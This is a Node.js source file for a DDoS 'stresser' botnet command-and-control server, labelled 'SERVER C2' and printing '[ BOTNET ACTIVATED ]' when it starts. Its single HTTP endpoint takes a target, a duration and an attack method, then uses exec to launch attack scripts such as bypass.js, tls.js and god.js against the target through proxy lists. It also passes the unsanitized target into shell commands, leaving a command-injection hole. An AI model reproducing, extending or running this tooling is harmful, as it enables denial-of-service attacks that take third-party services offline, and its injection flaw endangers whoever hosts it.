// SERVER C2 X L O L - STRESSER
// 2025 © AldoOfficialR

const express = require('express');
const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 10044;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`[ BOTNET ACTIVATED ]\nClick For Copy >> http://${data.origin}:${port}`);
return data
}

app.get('/apixlolstresser', (req, res) => {
  const { target, time, methods } = req.query;
  const xlol = new url.URL(target);
  const slurp = xlol.hostname
res.status(200).json({
    message: 'Connected! APIs.',
    target,
    time,
    methods
  });

if (methods === 'bypass') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/bypass.js ${target} ${time} 44 10 proxy.txt`);

} else if (methods === 'tls') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/tls.js ${target} ${time} 44 10 proxy.txt`);
    
} else if (methods === 'glory') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/glory.js ${target} ${time} 44 10 proxy.txt`);

} else if (methods === 'browser') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/browser.js ${target} ${time} 44 10 proxy.txt`);

} else if (methods === 'captcha') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/captcha.js ${target} ${time} 44 proxy.txt 10 captcha`);

} else if (methods === 'https') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/https.js ${target} ${time} 44 10 proxy.txt`);

} else if (methods === 'ninja') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/ninja.js ${target} ${time}`);
    
} else if (methods === 'quantum') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/quantum.js ${target} ${time} 64 10 proxy.txt`);

} else if (methods === 'god') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/god.js ${target} ${time} 44 10 proxy.txt`);

} else if (methods === 'proxy') {
    console.log(`Connected!`);
    exec(`node ./librarymethods/scrape.js`);
} else {}
});
app.listen(port, () => {
fetchData()
});
